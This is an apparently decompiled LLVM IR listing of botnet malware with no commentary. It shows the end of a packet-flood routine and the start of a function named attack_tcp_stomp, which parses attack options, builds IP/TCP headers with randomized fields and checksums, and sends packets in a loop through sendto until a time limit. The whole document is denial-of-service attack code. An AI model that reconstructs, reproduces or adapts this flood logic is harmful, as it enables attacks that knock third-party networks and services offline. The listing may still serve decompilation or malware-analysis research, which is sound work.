  store i16 0, i16* %v4_b18c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b194 = load i32, i32* @r5, align 4
  store i32 %v0_b194, i32* @r0, align 4
  %v2_b198 = call i32 @checksum_generic(i32 %v0_b194, i32 20)
  %v3_b198 = trunc i32 %v2_b198 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_b1a0 = load i32, i32* @r5, align 4
  %v4_b1a0 = add i32 %v3_b1a0, 10
  %v5_b1a0 = inttoptr i32 %v4_b1a0 to i16*
  store i16 %v3_b198, i16* %v5_b1a0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b1a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b1a8 = trunc i32 %v0_b1a8 to i16
  %v2_b1a8 = load i32, i32* @r6, align 4
  %v3_b1a8 = add i32 %v2_b1a8, 10
  %v4_b1a8 = inttoptr i32 %v3_b1a8 to i16*
  store i16 %v1_b1a8, i16* %v4_b1a8, align 2
  %v0_b1ac = load i32, i32* @r6, align 4
  store i32 %v0_b1ac, i32* @r0, align 4
  %v2_b1b0 = call i32 @checksum_generic(i32 %v0_b1ac, i32 20)
  %v3_b1b0 = trunc i32 %v2_b1b0 to i16
  %v3_b1b4 = load i32, i32* @r6, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 10
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v3_b1b0, i16* %v5_b1b4, align 2
  %v2_b1bc = load i32, i32* @r7, align 4
  %v3_b1bc = add i32 %v2_b1bc, 6
  %v4_b1bc = inttoptr i32 %v3_b1bc to i16*
  store i16 0, i16* %v4_b1bc, align 2
  %v0_b1c0 = load i32, i32* @r7, align 4
  store i32 %v0_b1c0, i32* @r1, align 4
  %v1_b1c4 = add i32 %v0_b1c0, 4
  %v2_b1c4 = inttoptr i32 %v1_b1c4 to i16*
  %v3_b1c4 = load i16, i16* %v2_b1c4, align 2
  %v4_b1c4 = zext i16 %v3_b1c4 to i32
  store i32 %v4_b1c4, i32* %r2.global-to-local, align 4
  %v0_b1c8 = load i32, i32* @sb, align 4
  store i32 %v0_b1c8, i32* %r3.global-to-local, align 4
  %v0_b1cc = load i32, i32* @r6, align 4
  %v4_b1d0 = call i32 @checksum_tcpudp(i32 %v0_b1cc, i32 %v0_b1c0, i32 %v4_b1c4, i32 %v0_b1c8)
  %v5_b1d0 = trunc i32 %v4_b1d0 to i16
  %v3_b1d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b1d4, i32* %r2.global-to-local, align 4
  %v3_b1d8 = mul i32 %v3_b1d4, 32
  store i32 %v3_b1d8, i32* %r3.global-to-local, align 4
  %v0_b1dc = load i32, i32* @r5, align 4
  %v1_b1dc = add i32 %v0_b1dc, 16
  %v2_b1dc = inttoptr i32 %v1_b1dc to i32*
  %v3_b1dc = load i32, i32* %v2_b1dc, align 4
  %v5_b1e0 = mul i32 %v3_b1d4, 24
  store i32 %v5_b1e0, i32* %r3.global-to-local, align 4
  %v1_b1e4 = load i32, i32* @sl, align 4
  %v2_b1e4 = add i32 %v1_b1e4, %v5_b1e0
  store i32 %v2_b1e4, i32* @lr, align 4
  %v2_b1e8 = add i32 %v2_b1e4, 4
  %v3_b1e8 = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v3_b1dc, i32* %v3_b1e8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b1f4 = load i32, i32* @r7, align 4
  %v4_b1f4 = add i32 %v3_b1f4, 6
  %v5_b1f4 = inttoptr i32 %v4_b1f4 to i16*
  store i16 %v5_b1d0, i16* %v5_b1f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b1fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b1fc = trunc i32 %v0_b1fc to i16
  %v2_b1fc = load i32, i32* %r3.global-to-local, align 4
  %v3_b1fc = load i32, i32* @sl, align 4
  %v4_b1fc = add i32 %v3_b1fc, %v2_b1fc
  %v5_b1fc = inttoptr i32 %v4_b1fc to i16*
  store i16 %v1_b1fc, i16* %v5_b1fc, align 2
  %v0_b200 = load i32, i32* %r2.global-to-local, align 4
  %v1_b200 = trunc i32 %v0_b200 to i16
  %v2_b200 = load i32, i32* @lr, align 4
  %v3_b200 = add i32 %v2_b200, 2
  %v4_b200 = inttoptr i32 %v3_b200 to i16*
  store i16 %v1_b200, i16* %v4_b200, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b208 = load i32, i32* @r5, align 4
  store i32 %v0_b208, i32* %r1.global-to-local, align 4
  %v0_b210 = load i32, i32* @r8, align 4
  store i32 %v0_b210, i32* %r2.global-to-local, align 4
  %v0_b214 = load i32, i32* @lr, align 4
  %v0_b218 = load i32, i32* %ip.global-to-local, align 4
  %v6_b21c = call i32 @__libc_sendto(i32 %v3_aea4, i32 %v0_b208, i32 %v0_b210, i32 16384, i32 %v0_b214, i32 %v0_b218)
  %v3_b220 = load i32, i32* %stack_var_-44, align 4
  %v1_b224 = add i32 %v3_b220, 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_b22c = icmp eq i32 %v1_b224, %arg2
  store i1 %v9_b22c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b224, i32* %stack_var_-44, align 4
  %v6_b234 = icmp slt i32 %v1_b224, %arg2
  br i1 %v6_b234, label %dec_label_pc_b238, label %dec_label_pc_b364

dec_label_pc_b238:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b120
  %v1_b24c = phi i32 [ %v1_b224, %dec_label_pc_b188 ], [ 0, %dec_label_pc_b120 ]
  %v5_b23c = mul i32 %v1_b24c, 24
  %v1_b240 = load i32, i32* @sl, align 4
  %v2_b240 = add i32 %v1_b240, %v5_b23c
  store i32 %v2_b240, i32* %r3.global-to-local, align 4
  store i32 %v2_ad60, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b240, 20
  %v2_b248 = inttoptr i32 %v1_b248 to i8*
  %v3_b248 = load i8, i8* %v2_b248, align 1
  %v4_b248 = zext i8 %v3_b248 to i32
  store i32 %v4_b248, i32* %r2.global-to-local, align 4
  %v4_b24c = mul i32 %v1_b24c, 4
  %v5_b24c = add i32 %v4_b24c, %v2_ad60
  %v6_b24c = inttoptr i32 %v5_b24c to i32*
  %v7_b24c = load i32, i32* %v6_b24c, align 4
  store i32 %v7_b24c, i32* @r5, align 4
  %v2_b250 = icmp ugt i8 %v3_b248, 30
  %v7_b250 = icmp eq i8 %v3_b248, 31
  store i1 %v7_b250, i1* %cpsr_z.global-to-local, align 1
  %v1_b254 = add i32 %v7_b24c, 24
  store i32 %v1_b254, i32* @r6, align 4
  %v1_b258 = add i32 %v7_b24c, 44
  store i32 %v1_b258, i32* @r7, align 4
  %v2_b25c = xor i1 %v7_b250, true
  %v3_b25c = and i1 %v2_b250, %v2_b25c
  br i1 %v3_b25c, label %dec_label_pc_b134, label %dec_label_pc_b260

dec_label_pc_b260:                                ; preds = %dec_label_pc_b238
  %v1_b260 = add i32 %v2_b240, 16
  %v2_b260 = inttoptr i32 %v1_b260 to i32*
  %v3_b260 = load i32, i32* %v2_b260, align 4
  store i32 %v3_b260, i32* %r4.global-to-local, align 4
  %v0_b264 = call i32 @rand_next()
  %v3_b268 = load i32, i32* %stack_var_-44, align 4
  %v5_b270 = mul i32 %v3_b268, 24
  %v1_b274 = and i32 %v3_b260, 16711680
  store i32 %v1_b274, i32* %ip.global-to-local, align 4
  %v3_b278 = udiv i32 %v3_b260, 16777216
  %v4_b27c = udiv i32 %v1_b274, 256
  %v5_b27c = or i32 %v4_b27c, %v3_b278
  store i32 %v5_b27c, i32* %r2.global-to-local, align 4
  %v1_b280 = load i32, i32* @sl, align 4
  %v2_b280 = add i32 %v1_b280, %v5_b270
  store i32 %v2_b280, i32* %r1.global-to-local, align 4
  %v1_b284 = and i32 %v3_b260, 65280
  store i32 %v1_b284, i32* %r3.global-to-local, align 4
  %v1_b288 = add i32 %v2_b280, 20
  %v2_b288 = inttoptr i32 %v1_b288 to i8*
  %v3_b288 = load i8, i8* %v2_b288, align 1
  %v4_b288 = zext i8 %v3_b288 to i32
  store i32 %v4_b288, i32* %ip.global-to-local, align 4
  %v5_b290 = call i32 @llvm.bswap.i32(i32 %v3_b260)
  %v7_b294 = lshr i32 %v0_b264, %v4_b288
  %v8_b294 = add i32 %v7_b294, %v5_b290
  %v1_b2a0 = and i32 %v8_b294, 65280
  store i32 %v1_b2a0, i32* %r1.global-to-local, align 4
  %v5_b2ac = call i32 @llvm.bswap.i32(i32 %v8_b294)
  store i32 %v5_b2ac, i32* %r3.global-to-local, align 4
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  %v1_b2b8 = load i32, i32* @r5, align 4
  %v2_b2b8 = add i32 %v1_b2b8, 16
  %v3_b2b8 = inttoptr i32 %v2_b2b8 to i32*
  store i32 %v5_b2ac, i32* %v3_b2b8, align 4
  br i1 %v2_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  %v0_b2c0 = call i32 @rand_next()
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  %v0_b2cc = load i32, i32* @fp, align 4
  %v9_b2cc = icmp eq i32 %v0_b2cc, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  store i1 %v9_b2cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b2d0 = load i32, i32* @r5, align 4
  %v2_b2d0 = add i32 %v1_b2d0, 12
  %v3_b2d0 = inttoptr i32 %v2_b2d0 to i32*
  store i32 %v0_b2c0, i32* %v3_b2d0, align 4
  br i1 %v9_b2cc, label %dec_label_pc_b2d8, label %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge

dec_label_pc_b2c0.dec_label_pc_b150_crit_edge:    ; preds = %dec_label_pc_b2c0
  %v1_b154.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b150

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b2c0, %dec_label_pc_b140
  %v0_b2d8 = call i32 @rand_next()
  %v3_b2e0 = urem i32 %v0_b2d8, 65536
  %v1_b2e8 = sub nsw i32 999, %v3_b2e0
  store i32 %v1_b2e8, i32* %r3.global-to-local, align 4
  %v1_b2ec = trunc i32 %v0_b2d8 to i16
  %v2_b2ec = load i32, i32* @r5, align 4
  %v3_b2ec = add i32 %v2_b2ec, 4
  %v4_b2ec = inttoptr i32 %v3_b2ec to i16*
  store i16 %v1_b2ec, i16* %v4_b2ec, align 2
  %v0_b2f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2f0 = trunc i32 %v0_b2f0 to i16
  %v2_b2f0 = load i32, i32* @r6, align 4
  %v3_b2f0 = add i32 %v2_b2f0, 4
  %v4_b2f0 = inttoptr i32 %v3_b2f0 to i16*
  store i16 %v1_b2f0, i16* %v4_b2f0, align 2
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v1_b2f8 = load i32, i32* @r4, align 4
  %v9_b2f8 = icmp eq i32 %v3_aefc, %v1_b2f8
  store i1 %v9_b2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2f8, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b300:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v0_b300 = call i32 @rand_next()
  %v1_b300 = trunc i32 %v0_b300 to i16
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v1_b308 = load i32, i32* @r4, align 4
  %v9_b308 = icmp eq i32 %v3_af00, %v1_b308
  store i1 %v9_b308, i1* %cpsr_z.global-to-local, align 1
  %v3_b30c = load i32, i32* @r5, align 4
  %v4_b30c = add i32 %v3_b30c, 44
  %v5_b30c = inttoptr i32 %v4_b30c to i16*
  store i16 %v1_b300, i16* %v5_b30c, align 2
  br i1 %v9_b308, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b314:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  %v0_b314 = call i32 @rand_next()
  %v1_b314 = trunc i32 %v0_b314 to i16
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %.thread29, label %bb83

.thread29:                                        ; preds = %dec_label_pc_b314
  %v3_b32430 = load i32, i32* @r7, align 4
  %v4_b32431 = add i32 %v3_b32430, 2
  %v5_b32432 = inttoptr i32 %v4_b32431 to i16*
  store i16 %v1_b314, i16* %v5_b32432, align 2
  br label %dec_label_pc_b330

bb83:                                             ; preds = %dec_label_pc_b314
  %v1_b320 = load i32, i32* @r5, align 4
  %v2_b320 = add i32 %v1_b320, 16
  %v3_b320 = inttoptr i32 %v2_b320 to i32*
  %v4_b320 = load i32, i32* %v3_b320, align 4
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  %v3_b324 = load i32, i32* @r7, align 4
  %v4_b324 = add i32 %v3_b324, 2
  %v5_b324 = inttoptr i32 %v4_b324 to i16*
  store i16 %v1_b314, i16* %v5_b324, align 2
  %v1_b328 = load i32, i32* %r3.global-to-local, align 4
  %v2_b328 = load i32, i32* @r6, align 4
  %v3_b328 = add i32 %v2_b328, 16
  %v4_b328 = inttoptr i32 %v3_b328 to i32*
  store i32 %v1_b328, i32* %v4_b328, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b330:                                ; preds = %.thread29, %dec_label_pc_b168
  %v0_b330 = call i32 @rand_next()
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  %v1_b33c = load i32, i32* @r6, align 4
  %v2_b33c = add i32 %v1_b33c, 16
  %v3_b33c = inttoptr i32 %v2_b33c to i32*
  store i32 %v0_b330, i32* %v3_b33c, align 4
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330
  %v0_b344 = load i32, i32* @r7, align 4
  %v1_b344 = add i32 %v0_b344, 8
  store i32 %v1_b344, i32* @r4, align 4
  store i32 %v5_ae2c, i32* %r1.global-to-local, align 4
  %v2_b350 = call i32 @rand_alphastr(i32 %v1_b344, i32 %v5_ae2c)
  store i32 %v5_ae2c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b35c = load i32, i32* @r4, align 4
  %v4_b35c = add i32 %v2_b35c, %v5_ae2c
  %v5_b35c = inttoptr i32 %v4_b35c to i8*
  store i8 0, i8* %v5_b35c, align 1
  br label %dec_label_pc_b188

dec_label_pc_b364:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b10c
  %v2_b368 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae90, i32* %ip.global-to-local, align 4
  %v9_b370 = icmp eq i32 %v2_ae90, %v2_b368
  store i1 %v9_b370, i1* %cpsr_z.global-to-local, align 1
  %v6_b374 = icmp slt i32 %v2_ae90, %v2_b368
  br i1 %v6_b374, label %dec_label_pc_b378, label %dec_label_pc_b10c

dec_label_pc_b378:                                ; preds = %dec_label_pc_b364, %entry, %dec_label_pc_b384
  %v1_b380 = phi i32 [ %v3_aea4, %entry ], [ %v1_b388, %dec_label_pc_b384 ], [ %v2_b368, %dec_label_pc_b364 ]
  store i32 %v3_ad34, i32* %r4.global-to-local, align 4
  store i32 %v24_ad34, i32* %fp.global-to-local, align 4
  store i32 %v27_ad34, i32* %lr.global-to-local, align 4
  ret i32 %v1_b380

dec_label_pc_b384:                                ; preds = %dec_label_pc_aeb4
  %v1_b388 = call i32 @__GI___libc_close(i32 %v3_aea4)
  br label %dec_label_pc_b378

; uselistorder directives
  uselistorder i16 %v1_b314, { 1, 0 }
  uselistorder i32 %v1_b2f8, { 1, 0 }
  uselistorder i32 %v0_b2d8, { 1, 0 }
  uselistorder i32 %v5_b2ac, { 1, 0 }
  uselistorder i32 %v3_b260, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_b24c, { 1, 0, 2 }
  uselistorder i32 %v1_b224, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b1d4, { 1, 0, 2 }
  uselistorder i1 %v2_b338, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b31c, { 2, 3, 1, 0 }
  uselistorder i1 %v7_b138, { 2, 1, 0 }
  uselistorder i32 %v0_b0b8, { 1, 0 }
  uselistorder i32 %v1_af40, { 1, 0 }
  uselistorder i32 %v3_af2c, { 2, 1, 0 }
  uselistorder i1 %v2_af04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_aef8, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_aef4, { 1, 0 }
  uselistorder i32 %v0_aef0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_aedc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_aed4, { 1, 0 }
  uselistorder i1 %v7_aea8, { 1, 0 }
  uselistorder i32 %v3_aea4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_ae90, { 2, 1, 0 }
  uselistorder i32 %v5_ae80, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_ae4c, { 2, 1, 3, 0 }
  uselistorder i32 %v5_ae2c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_ade0, { 1, 0 }
  uselistorder i32 %v1_adbc, { 2, 1, 0 }
  uselistorder i32 %v6_adb4, { 1, 0 }
  uselistorder i32 %v7_ad9c, { 1, 0, 4, 3, 2 }
  uselistorder i8 %v5_ad98, { 0, 2, 1 }
  uselistorder i32 %v6_ad78, { 1, 0 }
  uselistorder i32 %v2_ad60, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 1, 0, 3, 2, 8, 9, 10 }
  uselistorder label %dec_label_pc_b378, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b344, { 1, 0 }
  uselistorder label %dec_label_pc_b188, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp30 = call i8 @__decompiler_undefined_function_4()
  %tmp31 = call i16 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b394 = load i32, i32* @r4, align 4
  %v27_b394 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b3c0 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_b3d0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b3d4 = load i32, i32* @r4, align 4
  store i32 %v0_b3d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i32, i32* @r7, align 4
  store i32 %v0_b3e0, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r0.global-to-local, align 4
  %v5_b3e8 = inttoptr i32 %v0_b3d4 to i32*
  %v6_b3e8 = call i32 @attack_get_opt_int(i32 %v0_b3e4, i32* %v5_b3e8, i32 2, i32 %v0_b3e0)
  %v1_b3f4 = urem i32 %v6_b3e8, 256
  store i32 %v1_b3f4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b400 = load i32, i32* @r4, align 4
  store i32 %v0_b400, i32* %r1.global-to-local, align 4
  %v0_b404 = load i32, i32* @r5, align 4
  store i32 %v0_b404, i32* %r0.global-to-local, align 4
  %v5_b408 = trunc i32 %v6_b3e8 to i8
  %v6_b40c = inttoptr i32 %v0_b400 to i32*
  %v7_b40c = call i32 @attack_get_opt_int(i32 %v0_b404, i32* %v6_b40c, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_b410 = load i32, i32* @r4, align 4
  store i32 %v0_b410, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b40c, i32* @r8, align 4
  %v0_b420 = load i32, i32* @r5, align 4
  store i32 %v0_b420, i32* %r0.global-to-local, align 4
  %v4_b424 = inttoptr i32 %v0_b410 to i32*
  %v5_b424 = call i32 @attack_get_opt_int(i32 %v0_b420, i32* %v4_b424, i32 4, i32 64)
  %v1_b42c = urem i32 %v5_b424, 256
  store i32 %v1_b42c, i32* %ip.global-to-local, align 4
  %v0_b430 = load i32, i32* @r4, align 4
  store i32 %v0_b430, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r0.global-to-local, align 4
  %v5_b440 = trunc i32 %v5_b424 to i8
  %v6_b444 = inttoptr i32 %v0_b430 to i32*
  %v7_b444 = call i32 @attack_get_opt_int(i32 %v0_b43c, i32* %v6_b444, i32 5, i32 1)
  %v1_b450 = urem i32 %v7_b444, 256
  store i32 %v1_b450, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_b458 = load i32, i32* @r4, align 4
  store i32 %v0_b458, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b460 = load i32, i32* @r5, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v5_b468 = inttoptr i32 %v0_b458 to i32*
  %v6_b468 = call i32 @attack_get_opt_int(i32 %v0_b460, i32* %v5_b468, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_b46c = load i32, i32* @r4, align 4
  store i32 %v0_b46c, i32* %r1.global-to-local, align 4
  %v3_b470 = mul i32 %v6_b468, 65536
  store i32 %v3_b470, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_b478 = load i32, i32* @r7, align 4
  store i32 %v0_b478, i32* %r3.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r0.global-to-local, align 4
  %v3_b480 = urem i32 %v6_b468, 65536
  store i32 %v3_b480, i32* @sb, align 4
  %v4_b484 = inttoptr i32 %v0_b46c to i32*
  %v5_b484 = call i32 @attack_get_opt_int(i32 %v0_b47c, i32* %v4_b484, i32 10, i32 %v0_b478)
  %v1_b48c = urem i32 %v5_b484, 256
  store i32 %v1_b48c, i32* %ip.global-to-local, align 4
  %v0_b490 = load i32, i32* @r4, align 4
  store i32 %v0_b490, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v5_b4a4 = inttoptr i32 %v0_b490 to i32*
  %v6_b4a4 = call i32 @attack_get_opt_int(i32 %v0_b49c, i32* %v5_b4a4, i32 11, i32 1)
  %v1_b4ac = urem i32 %v6_b4a4, 256
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_b4b0 = load i32, i32* @r4, align 4
  store i32 %v0_b4b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4bc = load i32, i32* @r5, align 4
  store i32 %v0_b4bc, i32* %r0.global-to-local, align 4
  %v5_b4c4 = inttoptr i32 %v0_b4b0 to i32*
  %v6_b4c4 = call i32 @attack_get_opt_int(i32 %v0_b4bc, i32* %v5_b4c4, i32 12, i32 1)
  %v1_b4cc = urem i32 %v6_b4c4, 256
  store i32 %v1_b4cc, i32* %ip.global-to-local, align 4
  %v0_b4d0 = load i32, i32* @r4, align 4
  store i32 %v0_b4d0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_b4d8 = load i32, i32* @r7, align 4
  store i32 %v0_b4d8, i32* %r3.global-to-local, align 4
  %v0_b4dc = load i32, i32* @r5, align 4
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v5_b4e4 = inttoptr i32 %v0_b4d0 to i32*
  %v6_b4e4 = call i32 @attack_get_opt_int(i32 %v0_b4dc, i32* %v5_b4e4, i32 13, i32 %v0_b4d8)
  %v1_b4ec = urem i32 %v6_b4e4, 256
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_b4f0 = load i32, i32* @r4, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_b4f8 = load i32, i32* @r7, align 4
  store i32 %v0_b4f8, i32* %r3.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r5, align 4
  store i32 %v0_b4fc, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @attack_get_opt_int(i32 %v0_b4fc, i32* %v5_b504, i32 14, i32 %v0_b4f8)
  %v1_b50c = urem i32 %v6_b504, 256
  store i32 %v1_b50c, i32* %ip.global-to-local, align 4
  %v0_b510 = load i32, i32* @r4, align 4
  store i32 %v0_b510, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_b518 = load i32, i32* @r7, align 4
  store i32 %v0_b518, i32* %r3.global-to-local, align 4
  %v0_b51c = load i32, i32* @r5, align 4
  store i32 %v0_b51c, i32* %r0.global-to-local, align 4
  %v5_b524 = inttoptr i32 %v0_b510 to i32*
  %v6_b524 = call i32 @attack_get_opt_int(i32 %v0_b51c, i32* %v5_b524, i32 15, i32 %v0_b518)
  %v1_b52c = urem i32 %v6_b524, 256
  store i32 %v1_b52c, i32* %ip.global-to-local, align 4
  %v0_b530 = load i32, i32* @r7, align 4
  store i32 %v0_b530, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b538 = load i32, i32* @r4, align 4
  store i32 %v0_b538, i32* %r1.global-to-local, align 4
  %v0_b53c = load i32, i32* @r5, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b538 to i32*
  %v6_b544 = call i32 @attack_get_opt_int(i32 %v0_b53c, i32* %v5_b544, i32 %v0_b530, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
